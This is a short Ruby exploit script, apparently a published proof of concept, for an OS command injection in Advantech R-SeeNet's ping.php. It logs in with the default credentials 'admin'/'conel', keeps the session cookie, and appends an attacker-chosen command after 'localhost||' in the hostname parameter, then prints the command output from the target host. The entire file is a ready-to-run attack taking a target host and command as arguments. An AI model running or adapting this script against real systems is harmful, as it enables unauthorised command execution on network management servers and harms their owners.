#!/usr/bin/env ruby -W0
# Advantech R-SeeNet ping.php OS Command Injection
require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || 'whoami'

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    80, 
                                    context = {}, 
                                    ssl = false)

res = sock.request_cgi(
 {
 'uri'     => '/index.php',
 'version' => '1.0',
 'method'  => 'POST',
 'vars_post' => {
  'page' => 'login_change',
  'oper' => '0',
  'username' => 'admin', 
  'password' => 'conel',
  'submit' => 'Login'
 }
})

sock.send_request(res)
recv = sock.read_response()
 if recv and recv.code == 200
 cookie = recv.get_cookies
 res = sock.request_raw(
  {
   'uri'     => '/php/ping.php?hostname=localhost||' + Rex::Text.uri_encode(cmd),
   'cookie'  => cookie
  })
sock.send_request(res)
recv = sock.read_response()
puts recv.body
else
 puts '[!] Login failed'
 end
rescue => e
puts "[!] #{e.to_s}"
end
